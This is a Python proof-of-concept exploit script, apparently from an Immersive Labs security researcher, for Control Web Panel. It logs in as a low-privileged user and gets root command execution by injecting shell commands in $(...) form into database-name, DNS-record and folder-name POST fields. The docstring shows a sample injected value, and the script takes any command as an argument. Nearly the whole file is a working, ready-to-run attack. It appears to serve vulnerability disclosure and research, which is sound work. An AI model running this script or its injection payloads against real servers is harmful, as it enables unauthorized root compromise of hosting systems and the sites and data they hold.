# Copyright (C) 2022 Mat Rollings, Immersive Labs
# https://github.com/Immersive-Labs-Sec/
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
from pickletools import optimize
import requests
import base64
import urllib3

# Disable the Insecure Warnings for self signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

session = requests.session()
"""
Remote Code Execution as root from a low privileged user

Optimize a database and put command injection in the db name

- Requires a valid user login cookie
- CSRF token is not required

[POST] https://<IP>:2083/cwp_63929bc36d96c3d2/test/test/index.php?module=mysql_manager&acc=optimizerdb
[DATA] db=test_hello$(whoami>/tmp/xxx)

Author: Mat Rollings @stealthcopter
"""


def login(base_url, username, password):

    login_url = f'{base_url}/login/index.php?acc=validate'
    account_url = f'{base_url}/{username}/'

    data = {
        'username': username,
        'password': base64.b64encode(password.encode('ascii')),
        'sessioning': '0',
        'userlang': ''
    }

    response = session.post(login_url, data=data, verify=False)
    token = response.json().get('token')

    if not token:
        return False

    data = {
        'username': username,
        'password': '',
        'token': token,
        'intended': ''
    }

    response = session.post(account_url,
                            data=data,
                            verify=False,
                            allow_redirects=False)

    # Check the User cookie was set and will exist in our session
    cookies = response.cookies.get_dict()
    for key in cookies.keys():
        if key.startswith('cwpsrv-User-'):
            return True


def execute_rce(base_url, username, command, module):
    """Inject the command in to the POST request"""

    module_sets = {
        'dns_zone_editor': {
            'url_path': '/index.php?module=dns_zone_editor&acc=addregdns',
            'post_data': {
                'domain': 'test.example.com',
                'cachereg': '1',
                'namereg': f'$({command})',
                'valuereg': '"aGVsbG8="',
                'reg': 'TXT'
            }
        },
        'mysql_manager': {
            'url_path': '/index.php?module=mysql_manager&acc=optimizerdb',
            'post_data': {
                'db': f'$({command})'
            }
        },
        'disk_usage': {
            'url_path': '/index.php?module=disk_usage&acc=load_directory',
            'post_data': {
                'folder_name': f'/home/{username}/$({command})'
            }
        }
    }

    target_module = module_sets[module]
    target_url = f'{base_url}/{username}/{target_module["url_path"]}'
    post_data = target_module["post_data"]

    response = session.post(target_url, data=post_data, verify=False)

    if response.status_code == 200:
        return True


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description='Remote Code Execution as root from a low privileged user')
    parser.add_argument(
        '--target',
        help='Target Host e.g. 54.32.155.22',
        required=True)

    parser.add_argument(
        '--username',
        help='Username for an existing account',
        required=True)

    parser.add_argument(
        '--password',
        help="Password for existing account",
        required=True)

    parser.add_argument(
        '--module',
        help="Module to inject the command via",
        default='mysql_manager',
        choices=['mysql_manager', 'disk_usage', 'dns_zone_editor'],
        required=False)

    parser.add_argument(
        '--command',
        help="Command to inject",
        required=True)

    parser.add_argument(
        '--proxy',
        help="Proxy Requests through a default local BURP instance",
        required=False,
        action='store_true')

    args = parser.parse_args()

    if args.proxy:
        session.proxies.update(proxies)

    # Construct our Base URL
    base_url = f'https://{args.target}:2083'

    print(f'[+] Logging in to target with username {args.username}')
    authenticated = login(base_url, args.username, args.password)

    if authenticated:
        print('  [-] Auth Succesful')
        print(f'  [-] Selecting Module {args.module}')
        print('  [-] Attempting to trigger RCE')
        response = execute_rce(base_url, args.username, args.command,
                               args.module)
        if response:
            print('[*] Command probably executed')
        else:
            print('[!] The server returned an error, command may failed.')

    else:
        print(f'[!] Unable to authenticate with the target')
